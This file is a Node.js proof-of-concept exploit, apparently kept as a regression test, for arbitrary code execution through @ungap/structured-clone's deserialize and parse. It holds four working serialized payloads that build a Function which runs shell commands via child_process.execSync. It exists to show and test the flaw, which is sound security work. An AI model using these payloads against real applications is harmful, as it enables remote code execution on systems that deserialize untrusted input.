// Proof of Concept — Arbitrary Code Execution
// Run with: node poc_ace.js  (requires @ungap/structured-clone installed)

const { deserialize } = require('../cjs');
const { parse } = require('../cjs/json');

const cmd = process.platform === 'win32' ? 'whoami' : 'id';
const functionPayload = `return process.mainModule.require('child_process').execSync('${cmd}').toString()`;

// --- ERROR path (type constant 7 = ERROR) ---
function ErrorPath()
{
    console.log('ERROR path — executing payload...');
    const payloadError = JSON.stringify([
        [7, { name: 'Function', message: functionPayload }]
    ]);
    const fn1 = parse(payloadError);
    console.log('ERROR path — returned type:', typeof fn1);  // 'function'
    console.log('ERROR path — RCE output:', fn1());           // uid=0(root) gid=0(root) groups=0(root)
    console.log('-'.repeat(40))
}

// --- Fallback path (type string = 'Function') ---
function FallbackPath()
{
    console.log('FALLBACK path — executing payload...');
    const payloadFallback = JSON.stringify([
    ['Function', functionPayload]
    ]);
    const fn2 = parse(payloadFallback);
    console.log('Fallback path — returned type:', typeof fn2); // 'function'
    console.log('Fallback path — RCE output:', fn2());          // root
    console.log('-'.repeat(40))
}

// --- ERROR path triggering via toString ---
function ErrorPathToString()
{
    console.log('ErrorPathToString path — executing payload...');
    const payloadError = JSON.stringify([
        [2, [[1, 2]]],
        [0, "toString"],
        [7, { name: 'Function', message: functionPayload }]
    ]);
    const obj = parse(payloadError);
    console.log('ERROR toString path — returned type:', typeof obj);
    console.log('ERROR toString path — RCE output:', obj.toString());  // triggers toString → calls the function
    console.log('-'.repeat(40))
}

// --- Deserialize path triggering via toString ---
function DeserializePath()
{
    console.log('DeserializePath — executing payload...');
    const payload = [
        [2, [[1, 2]]],
        [0, "toString"],
        [7, { name: 'Function', message: functionPayload }]
    ];
    const obj = deserialize(payload);
    console.log('Deserialize path — returned type:', typeof obj);
    console.log('Deserialize path — RCE output:', obj.toString());  // triggers toString → calls the function
    console.log('-'.repeat(40))
}

let failures = 0;

try {
  ErrorPath();
  failures++;
} catch (e) {
  console.log('ErrorPath — error:', e.message);
}

try {
  FallbackPath();
  failures++;
} catch (e) {
  console.log('FallbackPath — error:', e.message);
}

try {
  ErrorPathToString();
  failures++;
} catch (e) {
  console.log('ErrorPathToString — error:', e.message);
}

try {
  DeserializePath();
  failures++;
} catch (e) {
  console.log('DeserializePath — error:', e.message);
}

if (failures > 0) {
  console.error(`${failures} failures`);
  process.exit(1);
}
